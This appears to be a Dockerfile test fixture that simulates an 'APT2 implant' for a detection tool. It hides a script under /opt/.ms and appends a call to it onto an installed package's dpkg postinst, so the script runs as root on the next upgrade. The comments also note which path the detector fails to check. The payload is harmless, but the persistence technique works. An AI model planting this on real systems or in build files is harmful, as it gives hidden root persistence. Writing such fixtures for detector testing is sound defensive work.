# APT2 implant: apt2-maintscript-payload (dpkg maintainer-script root exec).
# Appends a /opt payload invocation to an INSTALLED package's postinst (a
# real file in /var/lib/dpkg/info), which dpkg runs AS ROOT on the next
# install/upgrade. confexec maintscript.dpkg lifts the /opt edge ->
# non_package_path/orphan -> maintscript_execs_unmanaged_payload. (The
# script's own path is never provenance-checked; only the payload edge.)
# Picks the first installed *.postinst so it works on any dpkg host. Variables: (none)
RUN mkdir -p /opt/.ms && \
    printf '%s\n' '#!/bin/sh' 'sleep 1' > /opt/.ms/agent && \
    chown root:root /opt/.ms/agent && chmod 0755 /opt/.ms/agent && \
    PI=$(ls /var/lib/dpkg/info/*.postinst 2>/dev/null | head -1); PI=${PI:-/var/lib/dpkg/info/base-files.postinst}; \
    printf '%s\n' '/opt/.ms/agent &' >> "$PI" && \
    chown root:root "$PI" && chmod 0755 "$PI"
